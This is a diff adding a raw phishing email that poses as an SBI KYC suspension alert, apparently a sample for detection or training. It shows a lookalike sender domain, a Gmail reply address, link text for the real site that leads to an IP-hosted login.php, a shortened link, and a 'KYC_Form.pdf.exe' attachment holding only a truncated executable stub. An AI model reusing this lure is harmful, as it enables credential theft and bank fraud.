@@ -1,0 +1,55 @@
+Return-Path: <bounce@onlinesbi-verify.com>
+Delivered-To: officer@college.ac.in
+Received: from mx1.college.ac.in (mx1.college.ac.in [10.10.1.5])
+	by mailstore.college.ac.in (Postfix) with ESMTP id 4F2A1C0123
+	for <officer@college.ac.in>; Tue, 16 Sep 2025 10:14:09 +0530 (IST)
+Received: from mail.onlinesbi-verify.com (unknown [159.89.174.23])
+	by mx1.college.ac.in (Postfix) with ESMTP id 9B1D2C0045
+	for <officer@college.ac.in>; Tue, 16 Sep 2025 10:14:05 +0530 (IST)
+Received: from [192.168.43.7] (unknown [192.168.43.7])
+	by mail.onlinesbi-verify.com (Postfix) with ESMTPSA id 77AB12
+	for <officer@college.ac.in>; Tue, 16 Sep 2025 04:44:01 +0000 (UTC)
+Authentication-Results: mx1.college.ac.in; spf=pass smtp.mailfrom=onlinesbi-verify.com; dkim=none; dmarc=none header.from=onlinesbi-verify.com
+From: "SBI Alerts" <alerts@onlinesbi-verify.com>
+Reply-To: sbi.kyc.desk@gmail.com
+To: officer@college.ac.in
+Subject: URGENT: Your SBI account will be suspended - update KYC within 24 hours
+Date: Tue, 16 Sep 2025 04:43:58 +0000
+Message-ID: <20250916044358.1234@localhost.localdomain>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="MIX"
+
+--MIX
+Content-Type: multipart/alternative; boundary="ALT"
+
+--ALT
+Content-Type: text/plain; charset=utf-8
+
+Dear Customer,
+
+Your net banking access will be suspended within 24 hours because your KYC is incomplete.
+Verify your account immediately at https://onlinesbi.sbi/kyc to avoid blocking.
+
+Regards, SBI KYC Team
+
+--ALT
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Dear Customer,</p>
+<p>Your net banking access <b>will be suspended within 24 hours</b> because your KYC is incomplete.</p>
+<p>Verify your account immediately: <a href="http://159.89.174.23/sbi/login.php">https://onlinesbi.sbi/kyc</a></p>
+<p>Or use <a href="https://bit.ly/3sbikyc">this secure link</a>.</p>
+<p>Regards,<br>SBI KYC Team</p>
+</body></html>
+
+--ALT--
+
+--MIX
+Content-Type: application/octet-stream; name="KYC_Form.pdf.exe"
+Content-Disposition: attachment; filename="KYC_Form.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+--MIX--
